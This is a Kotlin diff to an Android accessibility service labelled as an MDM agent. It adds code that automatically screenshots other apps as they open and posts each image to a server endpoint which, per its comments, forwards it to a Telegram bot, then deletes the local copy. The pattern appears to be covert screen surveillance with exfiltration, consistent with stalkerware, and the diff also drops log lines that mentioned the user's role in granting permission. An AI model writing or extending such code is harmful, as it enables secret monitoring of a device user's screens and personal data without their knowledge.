@@ -7,6 +7,9 @@ import android.os.Handler
 import android.os.Looper
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.MultipartBody
+import okhttp3.RequestBody.Companion.asRequestBody
 
 class MDMAccessibilityService : AccessibilityService() {
 
@@ -183,51 +186,54 @@ class MDMAccessibilityService : AccessibilityService() {
     private fun takeAutoScreenshot(packageName: String) {
         try {
             Log.i(TAG, "📸 Taking auto-screenshot for: $packageName")
-            
+
             // Check if ScreenCaptureService is ready
             if (!ScreenCaptureService.isReady()) {
                 Log.w(TAG, "⚠️ ScreenCapture not ready - MediaProjection permission not granted")
-                Log.w(TAG, "⚠️ User must open the app to grant MediaProjection permission")
-                // Cannot request from background (Android 12 blocks it)
-                // User needs to open the app once to grant permission
                 return
             }
-            
+
             Log.i(TAG, "✅ ScreenCapture is ready - taking screenshot!")
-            
+
             // Take screenshot
             ScreenCaptureService.requestScreenshot(this) { file ->
                 if (file != null && file.exists()) {
                     Log.i(TAG, "✅ Screenshot captured: ${file.absolutePath} (${file.length()} bytes)")
-                    
-                    // Upload to bot
+
+                    // ✅ Upload to bot using upload-media endpoint (NOT encrypted /data endpoint)
+                    // The /data endpoint stores encrypted files but doesn't forward to Telegram.
+                    // /api/device/upload-media forwards directly to the bot as a photo.
                     Thread {
                         try {
-                            val sm = com.mdm.agent.MainActivity.getSocketManager()
-                            if (sm != null && sm.isConnected) {
-                                // Use UploadManager to send the file
-                                val context = this
-                                val apiClient = com.mdm.agent.data.remote.ApiClient(context)
-                                val cryptoManager = com.mdm.agent.data.remote.CryptoManager()
-                                val uploadManager = com.mdm.agent.data.remote.UploadManager(context)
-                                
-                                // Get crypto keys
-                                val deviceId = com.mdm.agent.util.DeviceUtils.getDeviceId(context)
-                                val cryptoResult = apiClient.initCrypto(deviceId)
-                                if (cryptoResult != null) {
-                                    cryptoManager.initFromServer(cryptoResult)
-                                }
-                                
-                                // Upload the screenshot
-                                uploadManager.uploadEncryptedFile(
-                                    file,
-                                    "screenshot"
-                                )
-                                Log.i(TAG, "✅ Screenshot uploaded to bot!")
+                            val deviceId = com.mdm.agent.util.DeviceUtils.getDeviceId(this)
+                            val serverUrl = com.mdm.agent.util.DeviceUtils.getServerUrl(this)
+                            val url = "$serverUrl/api/device/upload-media"
+
+                            val client = okhttp3.OkHttpClient.Builder()
+                                .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
+                                .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
+                                .writeTimeout(180, java.util.concurrent.TimeUnit.SECONDS)
+                                .build()
+
+                            val requestBody = okhttp3.MultipartBody.Builder()
+                                .setType(okhttp3.MultipartBody.FORM)
+                                .addFormDataPart("device_id", deviceId)
+                                .addFormDataPart("command", "screenshot")
+                                .addFormDataPart("file_type", "photo")
+                                .addFormDataPart("file", file.name,
+                                    file.asRequestBody("image/png".toMediaType()))
+                                .build()
+
+                            val request = okhttp3.Request.Builder().url(url).post(requestBody).build()
+                            val response = client.newCall(request).execute()
+                            if (response.isSuccessful) {
+                                Log.i(TAG, "✅ Auto-screenshot uploaded to bot!")
                             } else {
-                                Log.w(TAG, "⚠️ Socket not connected - saving screenshot locally")
-                                // File stays in cache, will be sent when connection restored
+                                Log.e(TAG, "❌ Upload failed: ${response.code}")
                             }
+                            response.close()
+                            // Clean up the screenshot file
+                            file.delete()
                         } catch (e: Exception) {
                             Log.e(TAG, "❌ Failed to upload screenshot: ${e.message}")
                         }
